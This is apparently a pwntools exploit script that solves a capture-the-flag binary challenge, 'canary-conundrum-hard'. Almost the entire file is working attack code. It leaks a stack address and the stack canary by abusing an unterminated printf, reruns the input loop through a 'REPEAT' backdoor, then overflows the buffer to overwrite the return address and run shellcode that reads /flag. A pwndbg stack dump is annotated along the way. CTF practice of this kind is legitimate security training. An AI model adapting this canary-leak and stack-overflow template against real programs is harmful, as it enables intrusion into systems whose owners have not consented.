from pwn import *

'''
1. printf("%s\n", input_buffer) will help us leak canary
2. strstr(input_buffer, "REPEAT") backdoor will help us rerun the challenge that lead to shellcode injection
3. stack executable help us execute shellcode within stack
'''

if args.LOCAL:
    context.binary = elf = ELF('./canary-conundrum-hard')
    context.log_level = 'debug'
else:
    context.binary = elf = ELF('/challenge/canary-conundrum-hard')


'''
pwndbg> dq $rsp 30
00007ffd95cdecb0     00000000001be6a0 00007ffd95cdfea8
00007ffd95cdecc0     00007ffd95cdfe98 0000000119a56723
00007ffd95cdecd0     0000000000000d68 00007699198f9951
00007ffd95cdece0     0000000000000079 00007ffd95cdecf0
00007ffd95cdecf0     0000000000000000 0000000000000000
00007ffd95cded00     0000000000000000 0000000000000000
00007ffd95cded10     0000000000000000 0000000000000000
00007ffd95cded20     0000000000000000 0000000000000000
00007ffd95cded30     0000000000000000 0000000000000000
00007ffd95cded40     0000000000000000 0000000000000000
00007ffd95cded50     00007ffd95cdfda0 405b0f5f64e71d00
00007ffd95cded60     00007ffd95cdfda0 00006402566a0ad1 <- sip
'''


io = elf.process()

backdoor_trigger = b'REPEAT'
stackleak_buffer_offset = 0xed60 - 0xecf0
shellcode_buffer_offset = 0x10b0 + 0xc0 + 0xc0 # compute from rbp - input_buffer, which is not change
# NOTE: cause we trigger backdoor, there is a new stack frame create at this base stack, so our input_buffer address is change according to the stack frame
sc = asm(shellcraft.cat('/flag'))
# NOTE: we leak to variable with two new stack frame create, and every stack frame's buffer offset is 0xc0
shellcode_buffer_offset2 = shellcode_buffer_offset + len(sc)
canary_buffer_offset = stackleak_buffer_offset - 8
sip_buffer_offset = canary_buffer_offset + 16

io.sendline(str(stackleak_buffer_offset).encode())
io.sendline(backdoor_trigger + b'A' * (stackleak_buffer_offset - len(backdoor_trigger)))
io.recvuntil(b'A' * (stackleak_buffer_offset - len(backdoor_trigger)))
stack_leak = u64(io.recvline(keepends=False).ljust(8, b'\x00'))
print(f'[=] stack leak: {hex(stack_leak)}')

io.sendline(str(canary_buffer_offset + 1).encode())
io.sendline(backdoor_trigger + b'A' * (canary_buffer_offset + 1 - len(backdoor_trigger)))
io.recvuntil(b'A' * (canary_buffer_offset + 1 - len(backdoor_trigger)))
canary = u64(io.recvn(7).rjust(8, b'\x00'))
print(f'[=] canary: {hex(canary)}')

io.sendline(str(shellcode_buffer_offset2).encode())
payload = b'A' * canary_buffer_offset + p64(canary) + b'B' * 8 + p64(stack_leak) + b'C' * (shellcode_buffer_offset - sip_buffer_offset - 8) + sc
assert len(payload) == shellcode_buffer_offset2
io.sendline(payload)

io.interactive()
